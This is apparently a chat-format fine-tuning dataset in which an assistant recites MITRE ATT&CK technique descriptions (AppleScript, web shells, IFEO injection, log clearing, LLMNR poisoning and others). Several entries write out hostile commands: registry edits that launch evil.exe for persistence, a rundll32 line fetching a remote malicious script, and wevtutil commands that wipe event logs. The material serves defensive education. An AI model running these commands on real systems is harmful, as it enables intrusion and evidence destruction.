a network\u2019s DHCP allocation pool. . The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'AppleScript' and with the Id: T1155 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'AppleScript' and with the Id: T1155 is described as follows: macOS and OS X applications send AppleEvent messages to each other for interprocess communications (IPC). These messages can be easily scripted with AppleScript for local or remote IPC. Osascript executes AppleScript and any other Open Scripting Architecture (OSA) language scripts. A list of OSA languages installed on a system can be found by using the <code>osalang</code> program.AppleEvent messages can be sent independently or as part of a script. These events can locate open windows, send keystrokes, and interact with almost any open application locally or remotely. Adversaries can use this to interact with open SSH connection, move to remote machines, and even present users with fake dialog boxes. These events cannot start applications remotely (they can start them locally though), but can interact with applications if they're already running remotely. Since this is a scripting language, it can be used to launch more common techniques as well such as a reverse shell via python  (Citation: Macro Malware Targets Macs). Scripts can be run from the command-line via <code>osascript /path/to/script</code> or <code>osascript -e \"script here\"</code>.. The systems targeted by this attack pattern are: macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Remote Service Session Hijacking' and with the Id: T1563 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Remote Service Session Hijacking' and with the Id: T1563 is described as follows: Adversaries may take control of preexisting sessions with remote services to move laterally in an environment. Users may use valid credentials to log into a service specifically designed to accept remote connections, such as telnet, SSH, and RDP. When a user logs into a service, a session will be established that will allow them to maintain a continuous interaction with that service.Adversaries may commandeer these sessions to carry out actions on remote systems. [Remote Service Session Hijacking](https://attack.mitre.org/techniques/T1563) differs from use of [Remote Services](https://attack.mitre.org/techniques/T1021) because it hijacks an existing session rather than creating a new session using [Valid Accounts](https://attack.mitre.org/techniques/T1078).(Citation: RDP Hijacking Medium)(Citation: Breach Post-mortem SSH Hijack). The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Binary Padding' and with the Id: T1027.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Binary Padding' and with the Id: T1027.001 is described as follows: Adversaries may use binary padding to add junk data and change the on-disk representation of malware. This can be done without affecting the functionality or behavior of a binary, but can increase the size of the binary beyond what some security tools are capable of handling due to file size limitations. Binary padding effectively changes the checksum of the file and can also be used to avoid hash-based blocklists and static anti-virus signatures.(Citation: ESET OceanLotus) The padding used is commonly generated by a function to create junk data and then appended to the end or applied to sections of malware.(Citation: Securelist Malware Tricks April 2017) Increasing the file size may decrease the effectiveness of certain tools and detection capabilities that are not designed or configured to scan large files. This may also reduce the likelihood of being collected for analysis. Public file scanning services, such as VirusTotal, limits the maximum size of an uploaded file to be analyzed.(Citation: VirusTotal FAQ) . The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Web Shell' and with the Id: T1505.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Web Shell' and with the Id: T1505.003 is described as follows: Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server.(Citation: volexity_0day_sophos_FW)In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. [China Chopper](https://attack.mitre.org/software/S0020) Web shell client).(Citation: Lee 2013). The systems targeted by this attack pattern are: Linux, Windows, macOS, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Group Policy Modification' and with the Id: T1484.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Group Policy Modification' and with the Id: T1484.001 is described as follows: Adversaries may modify Group Policy Objects (GPOs) to subvert the intended discretionary access controls for a domain, usually with the intention of escalating privileges on the domain. Group policy allows for centralized management of user and computer settings in Active Directory (AD). GPOs are containers for group policy settings made up of files stored within a predictable network path `\\<DOMAIN>\\SYSVOL\\<DOMAIN>\\Policies\\`.(Citation: TechNet Group Policy Basics)(Citation: ADSecurity GPO Persistence 2016) Like other objects in AD, GPOs have access controls associated with them. By default all user accounts in the domain have permission to read GPOs. It is possible to delegate GPO access control permissions, e.g. write access, to specific users or groups in the domain.Malicious GPO modifications can be used to implement many other malicious behaviors such as [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053), [Disable or Modify Tools](https://attack.mitre.org/techniques/T1562/001), [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105), [Create Account](https://attack.mitre.org/techniques/T1136), [Service Execution](https://attack.mitre.org/techniques/T1569/002),  and more.(Citation: ADSecurity GPO Persistence 2016)(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions)(Citation: Mandiant M Trends 2016)(Citation: Microsoft Hacking Team Breach) Since GPOs can control so many user and machine settings in the AD environment, there are a great number of potential attacks that can stem from this GPO abuse.(Citation: Wald0 Guide to GPOs)For example, publicly available scripts such as <code>New-GPOImmediateTask</code> can be leveraged to automate the creation of a malicious [Scheduled Task/Job](https://attack.mitre.org/techniques/T1053) by modifying GPO settings, in this case modifying <code>&lt;GPO_PATH&gt;\\Machine\\Preferences\\ScheduledTasks\\ScheduledTasks.xml</code>.(Citation: Wald0 Guide to GPOs)(Citation: Harmj0y Abusing GPO Permissions) In some cases an adversary might modify specific user rights like SeEnableDelegationPrivilege, set in <code>&lt;GPO_PATH&gt;\\MACHINE\\Microsoft\\Windows NT\\SecEdit\\GptTmpl.inf</code>, to achieve a subtle AD backdoor with complete control of the domain because the user account under the adversary's control would then be able to modify GPOs.(Citation: Harmj0y SeEnableDelegationPrivilege Right). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Browser Information Discovery' and with the Id: T1217 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Browser Information Discovery' and with the Id: T1217 is described as follows: Adversaries may enumerate information about browsers to learn more about compromised environments. Data saved by browsers (such as bookmarks, accounts, and browsing history) may reveal a variety of personal information about users (e.g., banking sites, relationships/interests, social media, etc.) as well as details about internal network resources such as servers, tools/dashboards, or other related infrastructure.(Citation: Kaspersky Autofill)Browser information may also highlight additional targets after an adversary has access to valid credentials, especially [Credentials In Files](https://attack.mitre.org/techniques/T1552/001) associated with logins cached by a browser.Specific storage locations vary based on platform and/or application, but browser information is typically stored in local files and databases (e.g., `%APPDATA%/Google/Chrome`).(Citation: Chrome Roaming Profiles). The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Private Keys' and with the Id: T1552.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Private Keys' and with the Id: T1552.004 is described as follows: Adversaries may search for private key certificate files on compromised systems for insecurely stored credentials. Private cryptographic keys and certificates are used for authentication, encryption/decryption, and digital signatures.(Citation: Wikipedia Public Key Crypto) Common key and certificate file extensions include: .key, .pgp, .gpg, .ppk., .p12, .pem, .pfx, .cer, .p7b, .asc. Adversaries may also look in common key directories, such as <code>~/.ssh</code> for SSH keys on * nix-based systems or <code>C:&#92;Users&#92;(username)&#92;.ssh&#92;</code> on Windows. Adversary tools may also search compromised systems for file extensions relating to cryptographic keys and certificates.(Citation: Kaspersky Careto)(Citation: Palo Alto Prince of Persia)When a device is registered to Azure AD, a device key and a transport key are generated and used to verify the device\u2019s identity.(Citation: Microsoft Primary Refresh Token) An adversary with access to the device may be able to export the keys in order to impersonate the device.(Citation: AADInternals Azure AD Device Identities)On network devices, private keys may be exported via [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as `crypto pki export`.(Citation: cisco_deploy_rsa_keys) Some private keys require a password or passphrase for operation, so an adversary may also use [Input Capture](https://attack.mitre.org/techniques/T1056) for keylogging or attempt to [Brute Force](https://attack.mitre.org/techniques/T1110) the passphrase off-line. These private keys can be used to authenticate to [Remote Services](https://attack.mitre.org/techniques/T1021) like SSH or for use in decrypting other collected files such as email.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Server' and with the Id: T1583.004 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Server' and with the Id: T1583.004 is described as follows: Adversaries may buy, lease, rent, or obtain physical servers\u00a0that can be used during targeting. Use of servers allows an adversary to stage, launch, and execute an operation. During post-compromise activity, adversaries may utilize servers for various tasks, such as watering hole operations in [Drive-by Compromise](https://attack.mitre.org/techniques/T1189), enabling [Phishing](https://attack.mitre.org/techniques/T1566) operations, or facilitating [Command and Control](https://attack.mitre.org/tactics/TA0011). Instead of compromising a third-party [Server](https://attack.mitre.org/techniques/T1584/004) or renting a [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003), adversaries may opt to configure and run their own servers in support of operations. Free trial periods of cloud servers may also be abused.(Citation: Free Trial PurpleUrchin)(Citation: Freejacked) Adversaries may only need a lightweight setup if most of their activities will take place using online infrastructure. Or, they may need to build extensive infrastructure if they want to test, communicate, and control other aspects of their activities on their own systems.(Citation: NYTStuxnet). The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Windows Remote Management' and with the Id: T1021.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Windows Remote Management' and with the Id: T1021.006 is described as follows: Adversaries may use [Valid Accounts](https://attack.mitre.org/techniques/T1078) to interact with remote systems using Windows Remote Management (WinRM). The adversary may then perform actions as the logged-on user.WinRM is the name of both a Windows service and a protocol that allows a user to interact with a remote system (e.g., run an executable, modify the Registry, modify services).(Citation: Microsoft WinRM) It may be called with the `winrm` command or by any number of programs such as PowerShell.(Citation: Jacobsen 2014) WinRM  can be used as a method of remotely interacting with [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047).(Citation: MSDN WMI). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Exfiltration Over Bluetooth' and with the Id: T1011.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Exfiltration Over Bluetooth' and with the Id: T1011.001 is described as follows: Adversaries may attempt to exfiltrate data over Bluetooth rather than the command and control channel. If the command and control network is a wired Internet connection, an adversary may opt to exfiltrate data using a Bluetooth communication channel.Adversaries may choose to do this if they have sufficient access and proximity. Bluetooth connections might not be secured or defended as well as the primary Internet-connected channel because it is not routed through the same enterprise network.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Default Accounts' and with the Id: T1078.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Default Accounts' and with the Id: T1078.001 is described as follows: Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module). The systems targeted by this attack pattern are: Windows, Azure AD, Office 365, SaaS, IaaS, Linux, macOS, Google Workspace, Containers, Network ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Time Providers' and with the Id: T1547.003 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Time Providers' and with the Id: T1547.003 is described as follows: Adversaries may abuse time providers to execute DLLs when the system boots. The Windows Time service (W32Time) enables time synchronization across and within domains.(Citation: Microsoft W32Time Feb 2018) W32Time time providers are responsible for retrieving time stamps from hardware/network resources and outputting these values to other network clients.(Citation: Microsoft TimeProvider)Time providers are implemented as dynamic-link libraries (DLLs) that are registered in the subkeys of `HKEY_LOCAL_MACHINE\\System\\CurrentControlSet\\Services\\W32Time\\TimeProviders\\`.(Citation: Microsoft TimeProvider) The time provider manager, directed by the service control manager, loads and starts time providers listed and enabled under this key at system startup and/or whenever parameters are changed.(Citation: Microsoft TimeProvider)Adversaries may abuse this architecture to establish persistence, specifically by creating a new arbitrarily named subkey  pointing to a malicious DLL in the `DllName` value. Administrator privileges are required for time provider registration, though execution will run in context of the Local Service account.(Citation: Github W32Time Oct 2017). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Image File Execution Options Injection' and with the Id: T1183 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Image File Execution Options Injection' and with the Id: T1183 is described as follows: Image File Execution Options (IFEO) enable a developer to attach a debugger to an application. When a process is created, a debugger present in an application\u2019s IFEO will be prepended to the application\u2019s name, effectively launching the new process under the debugger (e.g., \u201cC:\\dbg\\ntsd.exe -g  notepad.exe\u201d). (Citation: Microsoft Dev Blog IFEO Mar 2010)IFEOs can be set directly via the Registry or in Global Flags via the GFlags tool. (Citation: Microsoft GFlags Mar 2017) IFEOs are represented as <code>Debugger</code> values in the Registry under <code>HKLM\\SOFTWARE{\\Wow6432Node}\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\<executable></code> where <code><executable></code> is the binary on which the debugger is attached. (Citation: Microsoft Dev Blog IFEO Mar 2010)IFEOs can also enable an arbitrary monitor program to be launched when a specified program silently exits (i.e. is prematurely terminated by itself or a second, non kernel-mode process). (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018) Similar to debuggers, silent exit monitoring can be enabled through GFlags and/or by directly modifying IEFO and silent process exit Registry values in <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\</code>. (Citation: Microsoft Silent Process Exit NOV 2017) (Citation: Oddvar Moe IFEO APR 2018)An example where the evil.exe process is started when notepad.exe exits: (Citation: Oddvar Moe IFEO APR 2018)* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\notepad.exe\" /v GlobalFlag /t REG_DWORD /d 512</code>* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v ReportingMode /t REG_DWORD /d 1</code>* <code>reg add \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\SilentProcessExit\\notepad.exe\" /v MonitorProcess /d \"C:\\temp\\evil.exe\"</code>Similar to [Process Injection](https://attack.mitre.org/techniques/T1055), these values may be abused to obtain persistence and privilege escalation by causing a malicious executable to be loaded and run in the context of separate processes on the computer. (Citation: Elastic Process Injection July 2017) Installing IFEO mechanisms may also provide Persistence via continuous invocation.Malware may also use IFEO for Defense Evasion by registering invalid debuggers that redirect and effectively disable various system and security applications. (Citation: FSecure Hupigon) (Citation: Symantec Ushedix June 2008). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Rundll32' and with the Id: T1085 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Rundll32' and with the Id: T1085 is described as follows: The rundll32.exe program can be called to execute an arbitrary binary. Adversaries may take advantage of this functionality to proxy execution of code to avoid triggering security tools that may not monitor execution of the rundll32.exe process because of whitelists or false positives from Windows using rundll32.exe for normal operations.Rundll32.exe can be used to execute Control Panel Item files (.cpl) through the undocumented shell32.dll functions <code>Control_RunDLL</code> and <code>Control_RunDLLAsUser</code>. Double-clicking a .cpl file also causes rundll32.exe to execute. (Citation: Trend Micro CPL)Rundll32 can also been used to execute scripts such as JavaScript. This can be done using a syntax similar to this: <code>rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";document.write();GetObject(\"script:https[:]//www[.]example[.]com/malicious.sct\")\"</code>  This behavior has been seen used by malware such as Poweliks. (Citation: This is Security Command Line Confusion). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Modify Existing Service' and with the Id: T1031 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Modify Existing Service' and with the Id: T1031 is described as follows: Windows service configuration information, including the file path to the service's executable or recovery programs/commands, is stored in the Registry. Service configurations can be modified using utilities such as sc.exe and [Reg](https://attack.mitre.org/software/S0075).Adversaries can modify an existing service to persist malware on a system by using system utilities or by using custom tools to interact with the Windows API. Use of existing services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may make detection analysis more challenging. Modifying existing services may interrupt their functionality or may enable services that are disabled or otherwise not commonly used.Adversaries may also intentionally corrupt or kill services to execute malicious recovery programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft Service Recovery Feb 2013). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Trap' and with the Id: T1546.005 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Trap' and with the Id: T1546.005 is described as follows: Adversaries may establish persistence by executing malicious content triggered by an interrupt signal. The <code>trap</code> command allows programs and shells to specify commands that will be executed upon receiving interrupt signals. A common situation is a script allowing for graceful termination and handling of common keyboard interrupts like <code>ctrl+c</code> and <code>ctrl+d</code>.Adversaries can use this to register code to be executed when the shell encounters specific interrupts as a persistence mechanism. Trap commands are of the following format <code>trap 'command list' signals</code> where \"command list\" will be executed when \"signals\" are received.(Citation: Trap Manual)(Citation: Cyberciti Trap Statements). The systems targeted by this attack pattern are: macOS, Linux ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Dynamic Linker Hijacking' and with the Id: T1574.006 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Dynamic Linker Hijacking' and with the Id: T1574.006 is described as follows: Adversaries may execute their own malicious payloads by hijacking environment variables the dynamic linker uses to load shared libraries. During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as <code>LD_PRELOAD</code> on Linux or <code>DYLD_INSERT_LIBRARIES</code> on macOS. Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries)(Citation: Apple Doco Archive Dynamic Libraries) These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library.(Citation: Baeldung LD_PRELOAD)On Linux and macOS, hijacking dynamic linker variables may grant access to the victim process's memory, system/network resources, and possibly elevated privileges. This method may also evade detection from security products since the execution is masked under a legitimate process. Adversaries can set environment variables via the command line using the <code>export</code> command, <code>setenv</code> function, or <code>putenv</code> function. Adversaries can also leverage [Dynamic Linker Hijacking](https://attack.mitre.org/techniques/T1574/006) to export variables in a shell or set variables programmatically using higher level syntax such Python\u2019s <code>os.environ</code>.On Linux, adversaries may set <code>LD_PRELOAD</code> to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the operating system to load the adversary's malicious code upon execution of the victim program. <code>LD_PRELOAD</code> can be set via the environment variable or <code>/etc/ld.so.preload</code> file.(Citation: Man LD.SO)(Citation: TLDP Shared Libraries) Libraries specified by <code>LD_PRELOAD</code> are loaded and mapped into memory by <code>dlopen()</code> and <code>mmap()</code> respectively.(Citation: Code Injection on Linux and macOS)(Citation: Uninformed Needle) (Citation: Phrack halfdead 1997)(Citation: Brown Exploiting Linkers) On macOS this behavior is conceptually the same as on Linux, differing only in how the macOS dynamic libraries (dyld) is implemented at a lower level. Adversaries can set the <code>DYLD_INSERT_LIBRARIES</code> environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program.(Citation: TheEvilBit DYLD_INSERT_LIBRARIES)(Citation: Timac DYLD_INSERT_LIBRARIES)(Citation: Gabilondo DYLD_INSERT_LIBRARIES Catalina Bypass) . The systems targeted by this attack pattern are: Linux, macOS ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Local Account' and with the Id: T1136.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Local Account' and with the Id: T1136.001 is described as follows: Adversaries may create a local account to maintain access to victim systems. Local accounts are those configured by an organization for use by users, remote support, services, or for administration on a single system or service. For example, with a sufficient level of access, the Windows <code>net user /add</code> command can be used to create a local account. On macOS systems the <code>dscl -create</code> command can be used to create a local account. Local accounts may also be added to network devices, often via common [Network Device CLI](https://attack.mitre.org/techniques/T1059/008) commands such as <code>username</code>, or to Kubernetes clusters using the `kubectl` utility.(Citation: cisco_username_cmd)(Citation: Kubernetes Service Accounts Security)Such accounts may be used to establish secondary credentialed access that do not require persistent remote access tools to be deployed on the system.. The systems targeted by this attack pattern are: Linux, macOS, Windows, Network, Containers ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Communication Through Removable Media' and with the Id: T1092 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Communication Through Removable Media' and with the Id: T1092 is described as follows: Adversaries can perform command and control between compromised hosts on potentially disconnected networks using removable media to transfer commands from system to system.(Citation: ESET Sednit USBStealer 2014) Both systems would need to be compromised, with the likelihood that an Internet-connected system was compromised first and the second through lateral movement by [Replication Through Removable Media](https://attack.mitre.org/techniques/T1091). Commands and files would be relayed from the disconnected system to the Internet-connected system to which the adversary has direct access.. The systems targeted by this attack pattern are: Linux, macOS, Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Clear Windows Event Logs' and with the Id: T1070.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Clear Windows Event Logs' and with the Id: T1070.001 is described as follows: Adversaries may clear Windows Event Logs to hide the activity of an intrusion. Windows Event Logs are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.With administrator privileges, the event logs can be cleared with the following utility commands:* <code>wevtutil cl system</code>* <code>wevtutil cl application</code>* <code>wevtutil cl security</code>These logs may also be cleared through other mechanisms, such as the event viewer GUI or [PowerShell](https://attack.mitre.org/techniques/T1059/001). For example, adversaries may use the PowerShell command <code>Remove-EventLog -LogName Security</code> to delete the Security EventLog and after reboot, disable future logging.  Note: events may still be generated and logged in the .evtx file between the time the command is run and the reboot.(Citation: disable_win_evt_logging)Adversaries may also attempt to clear logs by directly deleting the stored log files within `C:\\Windows\\System32\\winevt\\logs\\`.. The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'Email Accounts' and with the Id: T1585.002 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'Email Accounts' and with the Id: T1585.002 is described as follows: Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Establishing email accounts may also allow adversaries to abuse free services \u2013 such as trial periods \u2013 to [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) for follow-on purposes.(Citation: Free Trial PurpleUrchin)Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)To decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016) . The systems targeted by this attack pattern are: PRE ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'LLMNR/NBT-NS Poisoning and SMB Relay' and with the Id: T1557.001 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'LLMNR/NBT-NS Poisoning and SMB Relay' and with the Id: T1557.001 is described as follows: By responding to LLMNR/NBT-NS network traffic, adversaries may spoof an authoritative source for name resolution to force communication with an adversary controlled system. This activity may be used to collect or relay authentication materials. Link-Local Multicast Name Resolution (LLMNR) and NetBIOS Name Service (NBT-NS) are Microsoft Windows components that serve as alternate methods of host identification. LLMNR is based upon the Domain Name System (DNS) format and allows hosts on the same local link to perform name resolution for other hosts. NBT-NS identifies systems on a local network by their NetBIOS name. (Citation: Wikipedia LLMNR)(Citation: TechNet NetBIOS)Adversaries can spoof an authoritative source for name resolution on a victim network by responding to LLMNR (UDP 5355)/NBT-NS (UDP 137) traffic as if they know the identity of the requested host, effectively poisoning the service so that the victims will communicate with the adversary controlled system. If the requested host belongs to a resource that requires identification/authentication, the username and NTLMv2 hash will then be sent to the adversary controlled system. The adversary can then collect the hash information sent over the wire through tools that monitor the ports for traffic or through [Network Sniffing](https://attack.mitre.org/techniques/T1040) and crack the hashes offline through [Brute Force](https://attack.mitre.org/techniques/T1110) to obtain the plaintext passwords.In some cases where an adversary has access to a system that is in the authentication path between systems or when automated scans that use credentials attempt to authenticate to an adversary controlled system, the NTLMv1/v2 hashes can be intercepted and relayed to access and execute code against a target system. The relay step can happen in conjunction with poisoning but may also be independent of it.(Citation: byt3bl33d3r NTLM Relaying)(Citation: Secure Ideas SMB Relay) Additionally, adversaries may encapsulate the NTLMv1/v2 hashes into various protocols, such as LDAP, SMB, MSSQL and HTTP, to expand and use multiple services with the valid NTLM response.\u00a0Several tools may be used to poison name services within local networks such as NBNSpoof, Metasploit, and [Responder](https://attack.mitre.org/software/S0174).(Citation: GitHub NBNSpoof)(Citation: Rapid7 LLMNR Spoofer)(Citation: GitHub Responder). The systems targeted by this attack pattern are: Windows ."}]}
{"messages": [{"role": "system", "content": "You are a chatbot specializing in the context of cybersecurity, you know many attack patterns."}, {"role": "user", "content": "What is the attack pattern known with the name: 'File and Directory Permissions Modification' and with the Id: T1222 ?"}, {"role": "assistant", "content": "The attack pattern with the name: 'File and Directory Permissions Modification' and with the Id: T1222 is described as follows: Adversaries may modify file or directory permissions/attributes to evade access control lists (ACLs) and access protected files.(Citation: Hybrid Analysis Icacls1 June 2018)(Citation: Hybrid Analysis Icacls2 May 2018) File and directory permissions are commonly managed by ACLs configured by the file or directory owner, or users with the appropriate permissions. File and directory ACL implementations vary by platform, but generally explicitly designate which users or groups can perform which actions (read, write, execute, etc.).Modifications may include changing specific access rights, which may require taking ownership of a file or directory and/or elevated permissions depending on the file or directory\u2019s existing permissions. This may enable malicious activity such as modifying, replacing, or deleting specific files or directories. Specific file and directory modifications may be a required step for many techniques, such as establishing Persistence via [Accessibility Features](https://attack.mitre.org/techniques/T1546/008), [Boot or Logon Initialization Scripts](https://attack.mitre.org/techniques/T1037), [Unix Shell Configuration Modification](https://attack.mitre.org/techniques/T1546/004), or tainting/hijacking other instrumental binary/configuration files via [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574).Adversaries may also change permissions of symbolic links. For example, malware (particularly ransomware) may modify symbolic links and associated settings to enable access to files from local shortcuts with remote paths.(Citation: new_rust_based_ransomware)(Citation: bad_luck_blackcat)(Citation: falconoverwatch_blackcat_attack)(Citation: blackmatter_blackcat)(Citation: fsutil_behavior) . The systems targeted by this attack pattern are: Linux, Windows, macOS ."}]}
